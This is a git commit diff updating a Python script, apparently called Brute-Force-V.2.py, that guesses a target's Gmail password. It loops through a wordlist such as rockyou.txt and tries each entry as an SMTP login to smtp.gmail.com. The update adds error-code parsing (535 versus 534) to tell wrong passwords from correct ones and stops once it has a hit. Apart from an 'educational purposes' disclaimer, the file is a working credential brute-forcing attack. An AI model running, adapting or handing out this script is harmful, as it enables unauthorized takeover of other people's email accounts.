6e876c13f6e36a6d0a7a1d12e2536faa3952d6a4
Loock Underwood <30809756+LoockUnderwood@users.noreply.github.com>
2017-10-07 16:24:48 -0300

    Update Brute-Force-V.2.py

--- Brute-Force-V.2.py
+++ Brute-Force-V.2.py
@@ -1,8 +1,9 @@
-#!/usr/bin/env python 
+#!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
 import smtplib
 import email.utils
+import time
 
 print(''' 
 
@@ -14,33 +15,40 @@ print('''
  $$ |  $$ |$$ |      $$ |  $$ |  $$ |$$\ $$   ____|                    $$ |\$  /$$ |$$  __$$ |$$ |$$ |
  $$$$$$$  |$$ |      \$$$$$$  |  \$$$$  |\$$$$$$$\                     $$ | \_/ $$ |\$$$$$$$ |$$ |$$ |
  \_______/ \__|       \______/    \____/  \_______|                    \__|     \__| \_______|\__|\__|
-                                                                                                     
-
- x---------------------------------x
- | By: Loock Underwood e B. Rudsen |
- x---------------------------------x ''')
-                                                                                                  
 
 
-print('\n - OBS: O Programa só funciona caso o E-mail alvo esteja com a opção Loguin com App Desconhecidos ON.')
+ x-----------------------------------------x
+ | By: Loock Underwood, B. Rudsen e Any0ne |
+ x-----------------------------------------x ''')
+
 print('\n - OBS: Script feito para "Fins Educativos".')
 
 ####################################################################################
 
 user = input('\n - Digite aqui o E-mail alvo: ')
-arquivo = open("lista.txt", "r")
+try:
+    arquivo = open("lista.txt", "r")
+except:
+    print('\n - Ex.: /usr/share/wordlists/rockyou.txt')
+    wordlist = input(' - Digite aqui a Wordlist: ')
+    arquivo = open(wordlist, "r")
 for linha in arquivo.readlines():
-	try:
-		smtpclient = smtplib.SMTP('smtp.gmail.com', 587)
-		smtpclient.ehlo()
-		smtpclient.starttls()
-		linha = linha.strip()
-		smtpclient.login(user, linha)
+    try:
+        smtpclient = smtplib.SMTP('smtp.gmail.com', 587)
+        smtpclient.ehlo()
+        smtpclient.starttls()
+        linha = linha.strip()
+        smtpclient.login(user, linha)
 
-		print('\n [!] Senha Encontrada: %s' % linha)
-		print('-----------------------------------')
-	except:
-	        print('\n [-] Senha Incorreta: %s' % linha)
-	        print('-----------------------------------')
-		
-	    
+        print('\n [!] Senha Encontrada: %s' % linha)
+        print('-----------------------------------')
+        break
+    except Exception as erro:
+        if str(erro).startswith('(535'):
+            print('\n [-] Senha Incorreta: %s' % linha)
+            print('-----------------------------------')
+        elif str(erro).startswith('(534'):
+            print('\n [!] Senha Encontrada: %s' % linha)
+            print('-----------------------------------')
+            time.sleep(10)
+            exit()
